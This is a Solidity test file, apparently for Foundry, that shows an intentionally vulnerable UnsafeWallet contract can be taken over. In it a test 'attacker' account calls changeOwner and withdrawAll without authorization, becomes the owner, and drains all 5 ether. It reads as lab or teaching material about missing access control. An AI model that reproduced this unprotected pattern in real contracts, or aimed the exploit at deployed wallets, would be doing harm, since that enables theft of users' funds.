// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/UnsafeWallet.sol";

interface Vm {
    function prank(address who) external;
    function deal(address who, uint256 newBalance) external;
}

contract UnsafeWalletTest {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    UnsafeWallet wallet;
    address attacker = address(0xBEEF);

    function setUp() public {
        wallet = new UnsafeWallet();
        vm.deal(address(wallet), 5 ether);
        vm.deal(attacker, 1 ether);
    }

    function testUnauthorizedChangeOwner() public {
        vm.prank(attacker);
        wallet.changeOwner(attacker);
        require(wallet.owner() == attacker, "Access control exploit: attacker acquired ownership");
    }

    function testUnauthorizedWithdrawAll() public {
        vm.prank(attacker);
        uint256 balBefore = attacker.balance;
        wallet.withdrawAll();
        require(attacker.balance == balBefore + 5 ether, "Access control exploit: attacker drained entire wallet");
    }
}
